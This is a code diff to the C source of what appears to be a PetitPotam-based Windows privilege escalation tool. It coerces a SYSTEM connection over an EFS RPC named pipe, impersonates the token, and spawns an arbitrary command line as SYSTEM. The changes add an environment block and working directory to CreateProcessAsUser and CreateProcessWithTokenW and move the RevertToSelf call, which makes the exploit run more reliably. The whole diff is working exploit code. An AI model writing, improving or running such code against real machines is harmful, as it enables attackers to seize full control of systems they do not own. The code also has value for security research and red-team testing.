@@ -9,11 +9,12 @@
 #include <userenv.h>
 
 #pragma comment(lib, "RpcRT4.lib")
+#pragma comment(lib, "userenv.lib")
 
 HANDLE CreatePetitNamedPipe();
 HANDLE ConnectPetitNamedPipe(HANDLE hNamedPipe);
 DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam);
-void GetSystem(HANDLE hNamedPipe, LPWSTR Command);
+void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine);
 void PetitPotamConnect(DWORD EfsID);
 
 void _tmain(int argc, TCHAR* argv[])
@@ -54,7 +55,7 @@ DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam)
 {
     HANDLE hNamedPipe = NULL;
     LPWSTR lpName;
-    LPWSTR Command = (LPWSTR)lpParam;
+    LPWSTR lpCommandLine = (LPWSTR)lpParam;
 
     SECURITY_DESCRIPTOR sd = { 0 };
     SECURITY_ATTRIBUTES sa = { 0 };
@@ -82,14 +83,14 @@ DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam)
         return 0;
     }
 
-    GetSystem(hNamedPipe, Command);
+    GetSystem(hNamedPipe, lpCommandLine);
     CloseHandle(hNamedPipe);
 
     return 0;
 }
 
 
-void GetSystem(HANDLE hNamedPipe, LPWSTR Command)
+void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine)
 {
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -97,6 +98,9 @@ void GetSystem(HANDLE hNamedPipe, LPWSTR Command)
     HANDLE hProcess;
     HANDLE hToken = NULL;
     HANDLE phNewToken = NULL;
+
+    LPWSTR lpCurrentDirectory = NULL;
+    LPVOID lpEnvironment = NULL;
 
     // clear a block of memory
     ZeroMemory(&si, sizeof(si));
@@ -133,7 +137,24 @@ void GetSystem(HANDLE hNamedPipe, LPWSTR Command)
         return;
     }
 
-    if (CreateProcessAsUser(phNewToken, NULL, Command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+    if (!(lpCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
+    {
+        return;
+    }
+
+    if (!GetSystemDirectory(lpCurrentDirectory, MAX_PATH))
+    {
+        printf("[-] GetSystemDirectory() Error: %i.\n", GetLastError());
+        return;
+    }
+
+    if (!CreateEnvironmentBlock(&lpEnvironment, phNewToken, FALSE))
+    {
+        printf("[-] CreateEnvironmentBlock() Error: %i.\n", GetLastError());
+        return;
+    }
+
+    if (CreateProcessAsUser(phNewToken, NULL, lpCommandLine, NULL, NULL, TRUE, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpCurrentDirectory, &si, &pi))
     {
         printf("[+] CreateProcessAsUser success.\n");
 
@@ -143,14 +164,14 @@ void GetSystem(HANDLE hNamedPipe, LPWSTR Command)
         return;
     }
     else if (GetLastError() != NULL)
-    {
+    {   
+        RevertToSelf();
         printf("[!] CreateProcessAsUser() failed, possibly due to missing privileges, retrying with CreateProcessWithTokenW().\n");
         
-        if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, NULL, Command, 0, NULL, NULL, &si, &pi))
+        if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, NULL, lpCommandLine, CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, lpEnvironment, lpCurrentDirectory, &si, &pi))
         {
             printf("[+] CreateProcessWithTokenW success.\n");
 
-            RevertToSelf();
             CloseHandle(hToken);
             CloseHandle(phNewToken);
 
@@ -160,7 +181,6 @@ void GetSystem(HANDLE hNamedPipe, LPWSTR Command)
         {
             printf("[-] CreateProcessWithTokenW failed (%d).\n", GetLastError());
 
-            RevertToSelf();
             CloseHandle(hToken);
             CloseHandle(phNewToken);
 
